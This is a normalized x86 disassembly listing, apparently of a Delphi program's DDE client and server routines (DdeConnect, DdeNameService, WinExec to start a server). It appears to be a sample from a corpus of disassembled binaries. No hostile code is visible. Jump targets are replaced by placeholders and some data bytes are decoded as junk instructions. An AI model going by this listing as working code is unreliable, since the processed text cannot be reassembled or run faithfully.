mov ebx edx
mov ebp eax
mov eax [ ebp + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x3c ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x38 ]
call sub_403390
xor eax eax
mov [ ebp + 0x38 ] eax
inc esi
xor edi edi
mov eax ebp
call sub_46d72c
mov eax [ ebp + 0x44 ]
push eax
call DdeUninitialize
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_423af4
test bl bl
jle r-xdata
call sub_403390
xor eax eax
mov [ ebp + 0x40 ] eax
mov eax [ ebp + 0x3c ]
call sub_403390
xor eax eax
mov [ ebp + 0x3c ] eax
inc esi
xor edi edi
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_41b654
call sub_403390
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403744
mov eax [ ebp + 0x3c ]
mov edx edi
call sub_41b654
call sub_403390
inc edi
dec esi
jne r-xdata
sub_46d434
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_46d4d8
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ edi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_404210
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46d758
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
push eax
push esi
call DdeCmpStringHandles
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46d7a8
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d4df
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov bl 0x1
sub_46d4e8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi ecx
mov ebp edx
mov ebx eax
xor edi edi
test esi esi
je r-xdata
mov eax edi
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov edx ebp
mov eax ebx
call sub_46d434
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x34 ]
mov [ esp ] eax
mov [ esp + 0x4 ] esi
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x10
lea eax [ esp + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_46d54c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46d61d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46ecc8
mov ebx eax
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_404210
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_404174
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46d758
mov [ ebx + 0x3c ] eax
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0x40 ] edi
push ebx
push 0xffffffff
push edi
call DdeSetUserHandle
mov edx ebx
mov eax [ esi + 0x38 ]
call sub_41b4f8
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46d7a8
mov [ ebx + 0x38 ] eax
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d624
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov si 0xffef
call sub_40358c
sub_46d630
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_40358c
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
push 0x0
push 0xffffffff
push eax
call DdeSetUserHandle
pop edi
pop esi
pop ebx
retn
mov edx ebx
call sub_41b7f0
mov eax ebx
call sub_403390
sub_46d678
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d714
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d72c
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408ae0
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x30 ]
call sub_404174
mov edx [ ebx + 0x30 ]
mov eax r-xdata
call sub_404724
mov esi eax
test esi esi
je r-xdata
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_4045e0
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeCreateStringHandleA
mov esi eax
mov [ ebx + 0x34 ] esi
push 0x1
push 0x0
push esi
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d71b
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax [ ebx + 0x30 ]
call sub_4043e0
mov ecx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404680
sub_46d72c
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
pop ebx
retn
push 0x2
push 0x0
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeFreeStringHandle
sub_46d758
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x40 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x40 ]
mov edx edi
call sub_41b654
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4082e8
test eax eax
jne r-xdata
sub_46d7a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_46d82a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464630
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d831
lea eax [ ebp - 0xc ]
call sub_404120
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_46461c
mov ebx eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_446f84
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4082e8
test eax eax
jne r-xdata
sub_46d83c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x38 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_41b654
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x30 ]
call sub_4082e8
test eax eax
jne r-xdata
sub_46d88c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
xor eax eax
push ebp
push sub_46d8e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_46d83c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d8ea
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov edx [ ebp - 0x4 ]
call sub_46f1b0
test eax eax
je r-xdata
call sub_46f394
sub_46d910
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423aa8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x9c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46d958
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_46df9c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423af4
mov eax [ esi + 0x9c ]
call sub_403390
xor eax eax
mov [ esi + 0x9c ] eax
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_46d998
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_423e20
push ebx
push sub_46da68
push ebx
push r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_46d9e5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46da5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_423ef8
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_4041b8
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x34 ]
call sub_4041b8
mov eax [ ebp - 0x4 ]
call sub_4043e0
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da63
cmp [ ebx + 0xc5 ] 0x1
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46dd58
sub_46da68
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_46db13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_41fde4
jmp r-xdata
mov eax esi
call sub_41ee80
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_420a84
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_404724
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov ecx eax
sub ecx ebx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404640
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x53
je r-xdata
mov eax esi
call sub_41fdec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46db1a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46e240
jmp r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46e254
jmp r-xdata
sub_46db27
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46dbe3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_421ff0
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x30 ]
call sub_4041b8
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_4092d8
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_423754
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x34 ]
call sub_4041b8
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_4092d8
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_423754
mov eax ebx
call sub_421ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dbea
lea eax [ ebp - 0x14 ]
call sub_404120
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
sub_46dc18
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e52c
mov esi eax
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_41b6d0
mov [ esi + 0x10 ] edi
xor edx edx
mov eax esi
call sub_46e59c
pop edi
pop esi
pop ebx
retn
sub_46dc50
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_46dd10
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_46e59c
mov edx ebx
mov eax [ esi + 0x9c ]
call sub_41b7f0
mov eax ebx
call sub_403390
sub_46dc88
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
mov edx edi
mov eax esi
call sub_46dd10
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4043e0
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_4043e0
test eax eax
jne r-xdata
mov edx edi
mov eax esi
call sub_46dc18
mov edx edi
mov eax esi
call sub_46dd10
mov ebx eax
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax ebx
call sub_46e59c
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46dc50
jmp r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_46dc50
sub_46dd10
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x4 ] eax
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_41b654
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov [ esp + 0x4 ] eax
jmp r-xdata
sub_46dd58
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_46df9c
mov edx ebx
mov eax esi
call sub_46e240
mov edx edi
mov eax esi
call sub_46e254
mov eax esi
call sub_46dda8
mov ebx eax
test bl bl
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
xor edx edx
mov eax esi
call sub_46e240
xor edx edx
mov eax esi
call sub_46e254
sub_46dda8
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x108 ] edx
mov edi eax
xor eax eax
push ebp
push sub_46df7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x38 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df85
lea eax [ ebp - 0x108 ]
call sub_404120
retn
mov eax [ edi + 0x30 ]
call sub_4043e0
test eax eax
jne r-xdata
cmp [ edi + 0xa0 ] 0x0
jne r-xdata
mov eax [ edi + 0x34 ]
call sub_4043e0
test eax eax
jne r-xdata
cmp [ edi + 0xa4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x30 ]
call sub_408ca8
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa0 ] eax
mov eax edi
call sub_46e01c
jmp r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_46e05c
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x34 ]
call sub_408ca8
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa4 ] eax
test bl bl
jne r-xdata
mov eax [ edi + 0x30 ]
call sub_4043e0
test eax eax
jne r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
call sub_46e01c
jmp r-xdata
mov eax [ edi + 0xc0 ]
call sub_4043e0
test eax eax
je r-xdata
mov eax [ edi + 0xc0 ]
call sub_4043e0
test eax eax
je r-xdata
mov [ edi + 0xa8 ] 0x1
mov [ edi + 0xa8 ] eax
jmp r-xdata
push [ edi + 0x30 ]
push r-xdata
push [ edi + 0x34 ]
lea eax [ ebp - 0x108 ]
mov edx 0x3
call sub_4044a0
mov edx [ ebp - 0x108 ]
lea eax [ ebp - 0x101 ]
call sub_408ca8
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0xc0 ]
call sub_408ca8
jmp r-xdata
mov eax edi
mov si 0xffee
call sub_40358c
xor ecx ecx
xor edx edx
mov eax edi
call sub_46e180
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_46e0d4
test al al
je r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_46e05c
mov ebx eax
push 0x7
lea eax [ ebp - 0x101 ]
push eax
call WinExec
cmp eax 0x20
jb r-xdata
sub_46df9c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
mov esi eax
mov eax ebx
call sub_46e13c
xor eax eax
mov [ ebx + 0x38 ] eax
push 0x0
push 0xffffffff
push esi
call DdeSetUserHandle
push esi
call DdeDisconnect
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa0 ] eax
xor edx edx
mov eax ebx
call sub_46e240
xor edx edx
mov eax ebx
call sub_46e254
pop esi
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa4 ] eax
sub_46e01c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x9c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov bx [ eax + 0x8 ]
dec ebx
test bx bx
jb r-xdata
inc ebx
mov eax [ esi + 0x9c ]
xor edx edx
call sub_41b654
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
call sub_46e418
dec bx
jne r-xdata
sub_46e05c
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp ecx
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402da4
mov [ esp ] 0x24
mov [ esp + 0xc ] 0x3ec
push esp
push ebp
push edi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeConnect
mov ebx eax
mov [ esi + 0x38 ] ebx
test ebx ebx
setne al
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x3c ] 0x60
lea eax [ esi + 0x3c ]
push eax
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeQueryConvInfo
push esi
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeSetUserHandle
sub_46e0d4
push ebx
push esi
push edi
push ebp
mov esi eax
xor eax eax
cmp [ esi + 0x38 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_41b654
mov edi eax
mov eax edi
call sub_46e79c
test al al
jne r-xdata
mov al 0x1
inc ebx
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ edi + 0x10 ]
call sub_46e418
jmp r-xdata
movzx eax bx
mov edx [ esi + 0x9c ]
cmp eax [ edx + 0x8 ]
jge r-xdata
sub_46e13c
push ebx
push esi
push edi
push ebp
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x38 ] eax
xor ebx ebx
jmp r-xdata
mov eax edi
mov si 0xffef
call sub_40358c
movzx ebp bx
mov esi [ edi + 0x9c ]
cmp ebp [ esi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax esi
call sub_41b654
call sub_46e894
inc ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46e180
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov [ esp ] edx
mov esi eax
xor ebx ebx
jmp r-xdata
movzx eax bx
mov ebp [ esi + 0x9c ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx edx bx
mov eax ebp
call sub_41b654
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
call sub_46e648
cmp edi [ eax + 0x8 ]
jne r-xdata
inc ebx
sub_46e1c0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc5 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov [ esi + 0xc5 ] bl
mov eax [ esi + 0x30 ]
call sub_4043e0
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
call sub_4043e0
test eax eax
je r-xdata
mov eax esi
call sub_46dda8
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
sub_46e2a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov ebx eax
mov cl [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_423dc4
cmp [ esp + 0x4 ] 0x1
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x9c ] 0x0
je r-xdata
xor esi esi
jmp r-xdata
movzx edi si
mov ebp [ ebx + 0x9c ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebp
call sub_41b654
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ ebx + 0x9c ]
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax edx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_46e418
inc esi
sub_46e31c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423aa8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46e360
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423af4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_46e390
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e40b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x34 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e412
lea eax [ ebp - 0x4 ]
call sub_404120
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x38 ]
call sub_4041b8
lea eax [ ebx + 0x38 ]
call sub_404120
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x34 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_46dc50
mov edx ebx
call sub_423b78
mov eax [ ebp - 0x4 ]
call sub_4043e0
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46e418
sub_46e418
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_404174
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x34 ]
call sub_46dc88
test al al
jne r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_404174
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
call sub_404120
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
cmp [ eax + 0xc5 ] 0x1
je r-xdata
sub_46e474
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_423dc4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
mov edx edi
mov eax [ edi + 0x34 ]
call sub_46dc50
xor eax eax
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x38 ]
call sub_404120
sub_46e4b0
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_4035bc
test al al
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46e4f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404120
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46e52c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
xor eax eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46e570
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_46e854
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bc24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_46e59c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46e639
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4041b8
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea eax [ esi + 0x4 ]
mov edx edi
call sub_404174
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x4 ]
call sub_4043e0
test eax eax
je r-xdata
mov eax esi
call sub_46e854
mov eax esi
call sub_46e724
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e640
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax [ esi + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
